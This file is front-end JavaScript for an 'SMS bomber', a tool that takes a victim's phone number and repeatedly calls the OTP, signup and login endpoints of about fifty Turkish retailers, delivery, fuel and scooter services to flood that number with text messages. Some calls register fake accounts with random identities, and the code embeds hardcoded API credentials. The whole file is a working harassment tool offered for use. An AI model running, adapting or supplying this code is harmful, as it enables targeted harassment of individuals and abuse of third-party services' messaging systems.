
async function start() {

    const number = document.getElementById('phoneNumber').value;
    const amount = document.getElementById('smsAmount').value;
    const worker_amount = document.getElementById('workerAmount').value;
    const resultDiv = document.getElementById('result');
    const statusDiv = document.getElementById('statusMessages');
    
   
    var targetContainer = document.getElementById('additional-container');
    targetContainer.style.display = 'block';
    
    async function joker(number) {
        try {
            const url = "https://www.joker.com.tr:443/kullanici/ajax/check-sms";
            const payload = { phone: `${number}` };
            const headers = { "user-agent": "" };
            const response = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify(payload),
                timeout: 5000
            });
            const data = await response.json();
            const r1 = data.success;
            if (r1 === true) {
                return [true, "Joker"];
            } else {
                return [false, "Joker"];
            }
        } catch (error) {
            return [false, "Joker"];
        }
    }
    
    async function hop(number) {
        try {
            const url = "https://api.hoplagit.com:443/v1/auth:reqSMS";
            const payload = { phone: `+90${number}` };
            const response = await fetch(url, {
                method: 'POST',
                body: JSON.stringify(payload),
                timeout: 5000
            });
            if (response.status === 201) {
                return [true, "Hop"];
            } else {
                return [false, "Hop"];
            }
        } catch (error) {
            return [false, "Hop"];
        }
    }
    
    async function a101(number) {
        try {
            const url = "https://www.a101.com.tr/users/otp-login/";
            const payload = { phone: `0${number}` };
            const response = await fetch(url, {
                method: 'POST',
                body: JSON.stringify(payload),
                timeout: 5000
            });
            if (response.status === 200) {
                return [true, "A101"];
            } else {
                return [false, "A101"];
            }
        } catch (error) {
            return [false, "A101"];
        }
    }
    
    async function bim(number) {
        try {
            const url = "https://bim.veesk.net/service/v1.0/account/login";
            const payload = { phone: `90${number}` };
            const response = await fetch(url, {
                method: 'POST',
                body: JSON.stringify(payload),
                timeout: 5000
            });
            if (response.status === 200) {
                return [true, "BIM"];
            } else {
                return [false, "BIM"];
            }
        } catch (error) {
            return [false, "BIM"];
        }
    }
    
    async function defacto(number) {
        try {
            const url = "https://www.defacto.com.tr/Customer/SendPhoneConfirmationSms";
            const payload = { mobilePhone: `0${number}` };
            const response = await fetch(url, {
                method: 'POST',
                body: JSON.stringify(payload),
                timeout: 5000
            });
            const data = await response.json();
            const r1 = data.Data;
            if (r1 === "IsSMSSend") {
                return [true, "Defacto"];
            } else {
                return [false, "Defacto"];
            }
        } catch (error) {
            return [false, "Defacto"];
        }
    }
    
    async function istegelsin(number) {
        try {
            const url = "https://prod.fasapi.net/";
            const payload = {
                query: "\n        mutation SendOtp2($phoneNumber: String!) {\n          sendOtp2(phoneNumber: $phoneNumber) {\n            alreadySent\n            remainingTime\n          }\n        }",
                variables: { phoneNumber: `90${number}` }
            };
            const response = await fetch(url, {
                method: 'POST',
                body: JSON.stringify(payload),
                timeout: 5000
            });
            if (response.status === 200) {
                return [true, "Ä°steGelsin"];
            } else {
                return [false, "Ä°steGelsin"];
            }
        } catch (error) {
            return [false, "Ä°steGelsin"];
        }
    }
    
    async function ikinciyeni(number) {
        try {
            const url = "https://apigw.ikinciyeni.com/RegisterRequest";
            const payload = {
                accountType: 1,
                email: `${randomstring.generate(12)}@gmail.com`,
                isAddPermission: false,
                name: randomstring.generate(8),
                lastName: randomstring.generate(8),
                phone: `${number}`
            };
            const response = await fetch(url, {
                method: 'POST',
                body: JSON.stringify(payload),
                timeout: 5000
            });
            const data = await response.json();
            const r1 = data.isSucceed;
            if (r1 === true) {
                return [true, "Ä°kinci Yeni"];
            } else {
                return [false, "Ä°kinci Yeni"];
            }
        } catch (error) {
            return [false, "Ä°kinci Yeni"];
        }
    }
    
    async function migros(number) {
        try {
            const url = "https://www.migros.com.tr/rest/users/login/otp";
            const payload = { phoneNumber: `${number}` };
            const response = await fetch(url, {
                method: 'POST',
                body: JSON.stringify(payload),
                timeout: 5000
            });
            const data = await response.json();
            const r1 = data.successful;
            if (r1 === true) {
                return [true, "Migros"];
            } else {
                return [false, "Migros"];
            }
        } catch (error) {
            return [false, "Migros"];
        }
    }
    
    async function ceptesok(number) {
        try {
            const url = "https://api.ceptesok.com/api/users/sendsms";
            const payload = { mobile_number: `${number}`, token_type: "register_token" };
            const response = await fetch(url, {
                method: 'POST',
                body: JSON.stringify(payload),
                timeout: 5000
            });
            if (response.status === 200) {
                return [true, "Cepte Åok"];
            } else {
                return [false, "Cepte Åok"];
            }
        } catch (error) {
            return [false, "Cepte Åok"];
        }
    }
    
    async function oliz(number) {
        try {
            const url = "https://api.oliz.com.tr/api/otp/send";
            const payload = {
                mobile_number: `${number}`,
                type: null
            };
            const response = await fetch(url, {
                method: 'POST',
                body: JSON.stringify(payload),
                timeout: 5000
            });
            const data = await response.json();
            const r1 = data.meta.messages.success[0];
            if (r1 === "SUCCESS_SEND_SMS") {
                return [true, "Oliz"];
            } else {
                return [false, "Oliz"];
            }
        } catch (error) {
            return [false, "Oliz"];
        }
    }
    
    async function macrocenter(number) {
        try {
            const url = `https://www.macrocenter.com.tr/rest/users/login/otp?reid=${Math.floor(Date.now() / 1000)}`;
            const payload = {
                phoneNumber: `${number}`
            };
            const response = await fetch(url, {
                method: 'POST',
                body: JSON.stringify(payload),
                timeout: 5000
            });
            const data = await response.json();
            const r1 = data.successful;
            if (r1 === true) {
                return [true, "Macro Center"];
            } else {
                return [false, "Macro Center"];
            }
        } catch (error) {
            return [false, "Macro Center"];
        }
    }
    
    async function marti(number) {
        try {
            const url = "https://customer.martiscooter.com/v13/scooter/dispatch/customer/signin";
            const payload = {
                mobilePhone: `${number}`,
                mobilePhoneCountryCode: "90"
            };
            const response = await fetch(url, {
                method: 'POST',
                body: JSON.stringify(payload),
                timeout: 5000
            });
            const data = await response.json();
            const r1 = data.isSuccess;
            if (r1 === true) {
                return [true, "MartÄ±"];
            } else {
                return [false, "MartÄ±"];
            }
        } catch (error) {
            return [false, "MartÄ±"];
        }
    }
    async function karma(number) {
        try {
            const url = "https://api.gokarma.app/v1/auth/send-sms";
            const payload = {
                phoneNumber: `90${number}`,
                type: "REGISTER",
                deviceId: `${Math.random().toString(36).substring(2, 18)}`,
                language: "tr-TR"
            };
            const response = await fetch(url, {
                method: 'POST',
                body: JSON.stringify(payload),
                timeout: 5000
            });
            if (response.status === 201) {
                return [true, "Karma"];
            } else {
                return [false, "Karma"];
            }
        } catch (error) {
            return [false, "Karma"];
        }
    }
    
    async function tiklagelsin(number) {
        try {
            const url = "https://www.tiklagelsin.com/user/graphql";
            const payload = {
                operationName: "GENERATE_OTP",
                variables: {
                    phone: `+90${number}`,
                    challenge: `${uuid.v4()}`,
                    deviceUniqueId: `web_${uuid.v4()}`
                },
                query: "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(\n    phone: $phone\n    challenge: $challenge\n    deviceUniqueId: $deviceUniqueId\n  )\n}\n"
            };
            const response = await fetch(url, {
                method: 'POST',
                body: JSON.stringify(payload),
                timeout: 5000
            });
            if (response.status === 200) {
                return [true, "TÄ±kla Gelsin"];
            } else {
                return [false, "TÄ±kla Gelsin"];
            }
        } catch (error) {
            return [false, "TÄ±kla Gelsin"];
        }
    }
    
    async function bisu(number) {
        try {
            const url = "https://www.bisu.com.tr/api/v2/app/authentication/phone/register";
            const payload = { phoneNumber: `${number}` };
            const response = await fetch(url, {
                method: 'POST',
                body: JSON.stringify(payload),
                timeout: 5000
            });
            if (response.status === 200) {
                return [true, "BiSU"];
            } else {
                return [false, "BiSU"];
            }
        } catch (error) {
            return [false, "BiSU"];
        }
    }
    
    async function file(number) {
        try {
            const url = "https://api.filemarket.com.tr/v1/otp/send";
            const payload = { mobilePhoneNumber: `90${number}` };
            const response = await fetch(url, {
                method: 'POST',
                body: JSON.stringify(payload),
                timeout: 5000
            });
            const data = await response.json();
            const r1 = data.data;
            if (r1 === "200 OK") {
                return [true, "File"];
            } else {
                return [false, "File"];
            }
        } catch (error) {
            return [false, "File"];
        }
    }
    
    async function ipragraz(number) {
        try {
            const url = "https://ipapp.ipragaz.com.tr/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp";
            const payload = { otp: "", phoneNumber: `${number}` };
            const response = await fetch(url, {
                method: 'POST',
                body: JSON.stringify(payload),
                timeout: 5000
            });
            if (response.status === 200) {
                return [true, "Ä°pragaz"];
            } else {
                return [false, "Ä°pragaz"];
            }
        } catch (error) {
            return [false, "Ä°pragaz"];
        }
    }
    
    async function pisir(number) {
        try {
            const url = "https://api.pisir.com/v1/login/";
            const payload = { msisdn: `90${number}` };
            const response = await fetch(url, {
                method: 'POST',
                body: JSON.stringify(payload),
                timeout: 5000
            });
            const data = await response.json();
            const r1 = data.ok;
            if (r1 === "1") {
                return [true, "PiÅŸir"];
            } else {
                return [false, "PiÅŸir"];
            }
        } catch (error) {
            return [false, "PiÅŸir"];
        }
    }
    
    async function coffy(number) {
        try {
            const url = "https://prod-api-mobile.coffy.com.tr/Account/Account/SendVerificationCode";
            const payload = { phoneNumber: `+90${number}` };
            const response = await fetch(url, {
                method: 'POST',
                body: JSON.stringify(payload),
                timeout: 5000
            });
            const data = await response.json();
            const r1 = data.success;
            if (r1 === true) {
                return [true, "Coffy"];
            } else {
                return [false, "Coffy"];
            }
        } catch (error) {
            return [false, "Coffy"];
        }
    }
    
    async function sushico(number) {
        try {
            const url = "https://api.sushico.com.tr/tr/sendActivation";
            const payload = { phone: `+90${number}`, location: 1, locale: "tr" };
            const response = await fetch(url, {
                method: 'POST',
                body: JSON.stringify(payload),
                timeout: 5000
            });
            const data = await response.json();
            const r1 = data.err;
            if (r1 === 0) {
                return [true, "SushiCo"];
            } else {
                return [false, "SushiCo"];
            }
        } catch (error) {
            return [false, "SushiCo"];
        }
    }
    
    async function kalmasin(number) {
        try {
            const url = "https://api.kalmasin.com.tr/user/login";
            const payload = {
                dil: "tr",
                device_id: "",
                notification_mobile: "android-notificationid-will-be-added",
                platform: "android",
                version: "2.0.6",
                login_type: 1,
                telefon: `${number}`
            };
            const response = await fetch(url, {
                method: 'POST',
                body: JSON.stringify(payload),
                timeout: 5000
            });
            const data = await response.json();
            const r1 = data.success;
            if (r1 === true) {
                return [true, "KalmasÄ±n"];
            } else {
                return [false, "KalmasÄ±n"];
            }
        } catch (error) {
            return [false, "KalmasÄ±n"];
        }
    }
    
    async function yotto(number) {
        try {
            const url = "account/session.json";
            const payload = { phone: `+90 (${number.substring(0, 3)}) ${number.substring(3, 6)}-${number.substring(6, 10)}` };
            const response = await fetch(url, {
                method: 'POST',
                body: JSON.stringify(payload),
                timeout: 5000
            });
            if (response.status === 201) {
                return [true, "Yotto"];
            } else {
                return [false, "Yotto"];
            }
        } catch (error) {
            return [false, "Yotto"];
        }
    }
    
    async function qumpara(number) {
        try {
            const url = "https://tr-api.fisicek.com/v1.4/auth/getOTP";
            const payload = { msisdn: `${number}` };
            const response = await fetch(url, {
                method: 'POST',
                body: JSON.stringify(payload),
                timeout: 5000
            });
            if (response.status === 200) {
                return [true, "Qumpara"];
            } else {
                return [false, "Qumpara"];
            }
        } catch (error) {
            return [false, "Qumpara"];
        }
    }
    
    async function aygaz(number) {
        try {
            const url = "https://ecommerce-memberapi.aygaz.com.tr/api/Membership/SendVerificationCode";
            const payload = { Gsm: `${number}` };
            const response = await fetch(url, {
                method: 'POST',
                body: JSON.stringify(payload),
                timeout: 5000
            });
            if (response.status === 200) {
                return [true, "Aygaz"];
            } else {
                return [false, "Aygaz"];
            }
        } catch (error) {
            return [false, "Aygaz"];
        }
    }
    

    async function pawapp(number) {
        try {
            const url = "https://api.pawder.app/api/authentication/sign-up";
            const payload = {
                languageId: "2",
                mobileInformation: "",
                data: {
                    firstName: randomstring.generate(10),
                    lastName: randomstring.generate(10),
                    userAgreement: "true",
                    kvkk: "true",
                    email: `${randomstring.generate(10)}@gmail.com`,
                    phoneNo: `${number}`,
                    username: randomstring.generate(10)
                }
            };
            const response = await fetch(url, {
                method: 'POST',
                body: JSON.stringify(payload),
                timeout: 5000
            });
            const data = await response.json();
            const r1 = data.success;
            if (r1 === true) {
                return [true, "PawAPP"];
            } else {
                return [false, "PawAPP"];
            }
        } catch (error) {
            return [false, "PawAPP"];
        }
    }
    
    async function mopas(number) {
        try {
            const token_response = await fetch("https://api.mopas.com.tr//authorizationserver/oauth/token?client_id=mobile_mopas&client_secret=secret_mopas&grant_type=client_credentials", {
                method: 'POST',
                timeout: 2000
            });
            if (token_response.status === 200) {
                const token_data = await token_response.json();
                const token = token_data.access_token;
                const token_type = token_data.token_type;
                const url = `https://api.mopas.com.tr//mopaswebservices/v2/mopas/sms/sendSmsVerification?mobileNumber=${number}`;
                const headers = { authorization: `${token_type} ${token}` };
                const sms_response = await fetch(url, {
                    headers: headers,
                    timeout: 2000
                });
                if (sms_response.status === 200) {
                    return [true, "MopaÅŸ"];
                } else {
                    return [false, "MopaÅŸ"];
                }
            } else {
                return [false, "MopaÅŸ"];
            }
        } catch (error) {
            return [false, "MopaÅŸ"];
        }
    }
    
    async function paybol(number) {
        try {
            const url = "https://pyb-mobileapi.walletgate.io/v1/Account/RegisterPersonalAccountSendOtpSms";
            const payload = { otp_code: "null", phone_number: `90${number}`, reference_id: "null" };
            const response = await fetch(url, {
                method: 'POST',
                body: JSON.stringify(payload),
                timeout: 5000
            });
            if (response.status === 200) {
                return [true, "Paybol"];
            } else {
                return [false, "Paybol"];
            }
        } catch (error) {
            return [false, "Paybol"];
        }
    }
    
    async function ninewest(number) {
        try {
            const url = "webservice/v1/register.json";
            const payload = {
                alertMeWithEMail: false,
                alertMeWithSms: false,
                dataPermission: true,
                email: "asdafwqww44wt4t4@gmail.com",
                genderId: Math.floor(Math.random() * 4),
                hash: "5488b0f6de",
                inviteCode: "",
                password: randomstring.generate(16),
                phoneNumber: `(${number.substring(0, 3)}) ${number.substring(3, 6)} ${number.substring(6, 8)} ${number.substring(8, 10)}`,
                registerContract: true,
                registerMethod: "mail",
                version: "3"
            };
            const response = await fetch(url, {
                method: 'POST',
                body: JSON.stringify(payload),
                timeout: 5000
            });
            const data = await response.json();
            const r1 = data.success;
            if (r1 === true) {
                return [true, "Nine West"];
            } else {
                return [false, "Nine West"];
            }
        } catch (error) {
            return [false, "Nine West"];
        }
    }
    
    async function saka(number) {
        try {
            const url = "https://mobilcrm2.saka.com.tr/api/customer/login";
            const payload = {
                gsm: `0${number}`
            };
            const response = await fetch(url, {
                method: 'POST',
                body: JSON.stringify(payload),
                timeout: 5000
            });
            const data = await response.json();
            const r1 = data.status;
            if (r1 === 1) {
                return [true, "Saka"];
            } else {
                return [false, "Saka"];
            }
        } catch (error) {
            return [false, "Saka"];
        }
    }
    
    async function superpedestrian(number) {
        try {
            const url = "https://consumer-auth.linkyour.city/consumer_auth/register";
            const payload = {
                phone_number: `+90${number.substring(0, 3)} ${number.substring(3, 6)} ${number.substring(6)}`
            };
            const response = await fetch(url, {
                method: 'POST',
                body: JSON.stringify(payload),
                timeout: 5000
            });
            const data = await response.json();
            const r1 = data.detail;
            if (r1 === "Ok") {
                return [true, "Superpedestrian"];
            } else {
                return [false, "Superpedestrian"];
            }
        } catch (error) {
            return [false, "Superpedestrian"];
        }
    }
    
    async function hayat(number) {
        try {
            const url = `https://www.hayatsu.com.tr/api/signup/otpsend?mobilePhoneNumber=${number}`;
            const response = await fetch(url, {
                method: 'POST',
                timeout: 5000
            });
            const data = await response.json();
            const r1 = data.IsSuccessful;
            if (r1 === true) {
                return [true, "Hayat"];
            } else {
                return [false, "Hayat"];
            }
        } catch (error) {
            return [false, "Hayat"];
        }
    }
    
    async function tazi(number) {
        try {
            const url = "https://mobileapiv2.tazi.tech/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin";
            const payload = {
                cep_tel: `${number}`,
                cep_tel_ulkekod: "90"
            };
            const headers = {
                authorization: "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"
            };
            const response = await fetch(url, {
                method: 'POST',
                body: JSON.stringify(payload),
                headers: headers,
                timeout: 5000
            });
            if (response.status === 200) {
                return [true, "TazÄ±"];
            } else {
                return [false, "TazÄ±"];
            }
        } catch (error) {
            return [false, "TazÄ±"];
        }
    }
    
    async function gofody(number) {
        try {
            const url = "https://backend.gofody.com/api/v1/enduser/register/";
            const payload = {
                country_code: "90",
                phone: `${number}`
            };
            const response = await fetch(url, {
                method: 'POST',
                body: JSON.stringify(payload),
                timeout: 5000
            });
            const data = await response.json();
            const r1 = data.success;
            if (r1 === true) {
                return [true, "GoFody"];
            } else {
                return [false, "GoFody"];
            }
        } catch (error) {
            return [false, "GoFody"];
        }
    }
    
    async function weescooter(number) {
        try {
            const url = "https://friendly-cerf.185-241-138-85.plesk.page/api/v1/members/gsmlogin";
            const payload = {
                tenant: "62a1e7efe74a84ea61f0d588",
                gsm: `${number}`
            };
            const response = await fetch(url, {
                method: 'POST',
                body: JSON.stringify(payload),
                timeout: 5000
            });
            if (response.status === 200) {
                return [true, "Wee Scooter"];
            } else {
                return [false, "Wee Scooter"];
            }
        } catch (error) {
            return [false, "Wee Scooter"];
        }
    }
    
    async function scooby(number) {
        try {
            const url = `https://sct.scoobyturkiye.com/v1/mobile/user/code-request?phoneNumber=90${number}`;
            const response = await fetch(url, {
                timeout: 5000
            });
            if (response.status === 200) {
                return [true, "Scooby"];
            } else {
                return [false, "Scooby"];
            }
        } catch (error) {
            return [false, "Scooby"];
        }
    }
    
    async function gez(number) {
        try {
            const url = `https://gezteknoloji.arabulucuyuz.net/api/Account/get-phone-number-confirmation-code-for-new-user?phonenumber=90${number}`;
            const response = await fetch(url, {
                timeout: 5000
            });
            const data = await response.json();
            const r1 = data.succeeded;
            if (r1 === true) {
                return [true, "Gez"];
            } else {
                return [false, "Gez"];
            }
        } catch (error) {
            return [false, "Gez"];
        }
    }
    
    async function heyscooter(number) {
        try {
            const url = `https://heyapi.heymobility.tech/V9//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber=${number}`;
            const headers = { "user-agent": "okhttp/3.12.1" };
            const response = await fetch(url, {
                method: 'POST',
                headers: headers,
                timeout: 5000
            });
            const data = await response.json();
            const r1 = data.IsSuccess;
            if (r1 === true) {
                return [true, "Hey Scooter"];
            } else {
                return [false, "Hey Scooter"];
            }
        } catch (error) {
            return [false, "Hey Scooter"];
        }
    }
    
    async function jetle(number) {
        try {
            const url = `http://ws.geowix.com/GeoCourier/SubmitPhoneToLogin?phonenumber=${number}&firmaID=1048`;
            const response = await fetch(url, {
                timeout: 5000
            });
            if (response.status === 200) {
                return [true, "Jetle"];
            } else {
                return [false, "Jetle"];
            }
        } catch (error) {
            return [false, "Jetle"];
        }
    }
    
    async function rabbit(number) {
        try {
            const url = "https://api.rbbt.com.tr/v1/auth/authenticate";
            const payload = {
                mobile_number: `+90${number}`,
                os_name: "android",
                os_version: "7.1.2",
                app_version: " 1.0.2(12)",
                push_id: "-"
            };
            const response = await fetch(url, {
                method: 'POST',
                body: JSON.stringify(payload),
                timeout: 5000
            });
            const data = await response.json();
            const r1 = data.status;
            if (r1 === true) {
                return [true, "Rabbit"];
            } else {
                return [false, "Rabbit"];
            }
        } catch (error) {
            return [false, "Rabbit"];
        }
    }
    
    async function roombadi(number) {
        try {
            const url = "https://api.roombadi.com/api/v1/auth/otp/authenticate";
            const payload = { phone: `${number}`, countryId: 2 };
            const response = await fetch(url, {
                method: 'POST',
                body: JSON.stringify(payload),
                timeout: 5000
            });
            if (response.status === 200) {
                return [true, "Roombadi"];
            } else {
                return [false, "Roombadi"];
            }
        } catch (error) {
            return [false, "Roombadi"];
        }
    }
    
    async function hizliecza(number) {
        try {
            const url = "https://hizlieczaprodapi.hizliecza.net/mobil/account/sendOTP";
            const payload = { phoneNumber: `+90${number}`, otpOperationType: 2 };
            const response = await fetch(url, {
                method: 'POST',
                body: JSON.stringify(payload),
                timeout: 5000
            });
            const data = await response.json();
            const r1 = data.isSuccess;
            if (r1 === true) {
                return [true, "HÄ±zlÄ± Ecza"];
            } else {
                return [false, "HÄ±zlÄ± Ecza"];
            }
        } catch (error) {
            return [false, "HÄ±zlÄ± Ecza"];
        }
    }
    
    async function signalall(number) {
        try {
            const url = "https://appservices.huzk.com/client/register";
            const payload = {
                name: "",
                phone: {
                    number: `${number}`,
                    code: "90",
                    country_code: "TR",
                    name: ""
                },
                countryCallingCode: "+90",
                countryCode: "TR",
                approved: true,
                notifyType: 99,
                favorites: [],
                appKey: "live-exchange"
            };
            const response = await fetch(url, {
                method: 'POST',
                body: JSON.stringify(payload),
                timeout: 5000
            });
            const data = await response.json();
            const r1 = data.success;
            if (r1 === true) {
                return [true, "SignalAll"];
            } else {
                return [false, "SignalAll"];
            }
        } catch (error) {
            return [false, "SignalAll"];
        }
    }
    
    async function goyakit(number) {
        try {
            const url = `https://gomobilapp.ipragaz.com.tr/api/v1/0/authentication/sms/send?phone=${number}&isRegistered=false`;
            const response = await fetch(url, { timeout: 5000 });
            const data = await response.json();
            const r1 = data.data.success;
            if (r1 === true) {
                return [true, "Go YakÄ±t"];
            } else {
                return [false, "Go YakÄ±t"];
            }
        } catch (error) {
            return [false, "Go YakÄ±t"];
        }
    }
    
    async function pinar(number) {
        try {
            const url = "https://pinarsumobileservice.yasar.com.tr/pinarsu-mobil/api/Customer/SendOtp";
            const payload = {
                MobilePhone: `${number}`
            };
            const headers = {
                devicetype: "android"
            };
            const response = await fetch(url, {
                method: 'POST',
                body: JSON.stringify(payload),
                headers,
                timeout: 5000
            });
            const data = await response.json();
            if (data === true) {
                return [true, "PÄ±nar"];
            } else {
                return [false, "PÄ±nar"];
            }
        } catch (error) {
            return [false, "PÄ±nar"];
        }
    }
    async function kimgbister(number) {
        try {
            const url = "https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp";
            const payload = {
                msisdn: `90${number}`
            };
            const response = await fetch(url, {
                method: 'POST',
                body: JSON.stringify(payload),
                timeout: 5000
            });
    
            if (response.status === 200) {
                return [true, "Kim GB Ister"];
            } else {
                return [false, "Kim GB Ister"];
            }
        } catch (error) {
            return [false, "Kim GB Ister"];
        }
    }
    
    async function anadolu(number) {
        try {
            const url = "https://www.anadolu.com.tr/Iletisim_Formu_sms.php";
            const payload = new URLSearchParams({
                Numara: `${number}`.match(/(\d{3})(\d{3})(\d{2})(\d{2})/).slice(1).join('')
            });
            const headers = {
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8"
            };
            const response = await fetch(url, {
                method: 'POST',
                body: payload,
                headers,
                timeout: 5000
            });
    
            if (response.status === 200) {
                return [true, "Anadolu"];
            } else {
                return [false, "Anadolu"];
            }
        } catch (error) {
            return [false, "Anadolu"];
        }
    }
    
    async function total(number) {
        try {
            const url = `https://mobileapi.totalistasyonlari.com.tr:443/SmartSms/SendSms?gsmNo=${number}`;
            const response = await fetch(url, {
                method: 'POST',
                timeout: 5000
            });
            const data = await response.json();
            const success = data.success;
    
            if (success === true) {
                return [true, "Total"];
            } else {
                return [false, "Total"];
            }
        } catch (error) {
            return [false, "Total"];
        }
    }
    
    async function englishhome(number) {
        try {
            const url = "https://www.englishhome.com:443/enh_app/users/registration/";
            const payload = {
                first_name: [...Array(8)].map(() => Math.random().toString(36)[2]).join(''),
                last_name: [...Array(8)].map(() => Math.random().toString(36)[2]).join(''),
                email: `${[...Array(16)].map(() => Math.random().toString(36)[2]).join('')}@gmail.com`,
                phone: `0${number}`,
                password: [...Array(8)].map(() => Math.random().toString(36)[2] + Math.random().toString(10)[2] + Math.random().toString(36)[2].toUpperCase()).join(''),
                email_allowed: false,
                sms_allowed: false,
                confirm: true,
                tom_pay_allowed: true
            };
            const response = await fetch(url, {
                method: 'POST',
                body: JSON.stringify(payload),
                timeout: 5000
            });
    
            if (response.status === 202) {
                return [true, "English Home"];
            } else {
                return [false, "English Home"];
            }
        } catch (error) {
            return [false, "English Home"];
        }
    }
    
    async function petrolofisi(number) {
        try {
            const url = "https://mobilapi.petrolofisi.com.tr:443/api/auth/register";
            const payload = {
                approvedContractVersion: "v1",
                approvedKvkkVersion: "v1",
                contractPermission: true,
                deviceId: "",
                etkContactPermission: true,
                kvkkPermission: true,
                mobilePhone: `0${number}`,
                name: [...Array(8)].map(() => Math.random().toString(36)[2]).join(''),
                plate: `${String(Math.floor(Math.random() * 80) + 1).padStart(2, '0')}${[...Array(3)].map(() => Math.random().toString(36)[2].toUpperCase()).join('')}${String(Math.floor(Math.random() * 999) + 1).padStart(3, '0')}`,
                positiveCard: "",
                referenceCode: "",
                surname: [...Array(8)].map(() => Math.random().toString(36)[2]).join('')
            };
            const headers = {
                "X-Channel": "IOS"
            };
            const response = await fetch(url, {
                method: 'POST',
                body: JSON.stringify(payload),
                headers,
                timeout: 5000
            });
    
            if (response.status === 204) {
                return [true, "Petrol Ofisi"];
            } else {
                return [false, "Petrol Ofisi"];
            }
        } catch (error) {
            return [false, "Petrol Ofisi"];
        }
    }
    

    async function send_service(number, service) {
        
        try {
            const result = await service(number);
            if (result[0] === true) {
                statusDiv.innerHTML += `<p>[+] ${result[1]}</p>`;
            } else {
                statusDiv.innerHTML += `<p>[-] ${result[1]}</p>`;
            }
        } catch (error) {
            statusDiv.innerHTML += `<p>Error: ${error}</p>`;
}
    }
    
    async function send(number, amount, worker_amount) {
        const smsStatusDiv = document.getElementById('smsStatus');
        smsStatusDiv.innerHTML = `SMS gÃ¶nderimi baÅŸlatÄ±ldÄ±...`;
        const functions = [a101, anadolu, aygaz, bim, hop, joker, bisu, ceptesok, coffy, defacto, englishhome, file, gez, gofody, goyakit, hayat, heyscooter, hizliecza, ikinciyeni, ipragraz, istegelsin, jetle, joker, kalmasin, kimgbister, macrocenter, marti, migros, mopas, ninewest, oliz, pawapp, paybol, petrolofisi, pinar, pisir, qumpara, rabbit, roombadi, saka, scooby, signalall, superpedestrian, sushico, tazi, tiklagelsin, total, weescooter, yotto];
        console.log(`Starting SMS sending to ${number}!`);
    
        const promises = [];
        for (let i = 0; i < amount; i++) {
            const index = i % functions.length;
            promises.push(send_service(number, functions[index]));
        }
    
        const results = await Promise.all(promises);
    
 
    const successfulServices = [];
    const failedServices = [];
    results.forEach(result => {
        if (result[0]) {
            successfulServices.push(result[1]);
        } else {
            failedServices.push(result[1]);
        }
    });

    const successList = document.getElementById('successList');
    const failureList = document.getElementById('failureList');

    successfulServices.forEach(service => {
        const li = document.createElement('li');
        li.textContent = `${service}: Success`;
        successList.appendChild(li);
    });

    failedServices.forEach(service => {
        const li = document.createElement('li');
        li.textContent = `${service}: Failed`;
        failureList.appendChild(li);
    });
        smsStatusDiv.innerHTML = `SMS gÃ¶nderimi tamamlandÄ±.`;
    }
    
    async function start(number, amount, worker_amount) {
        await send(number, amount, worker_amount);
    }
    
    start(number, amount, worker_amount);
}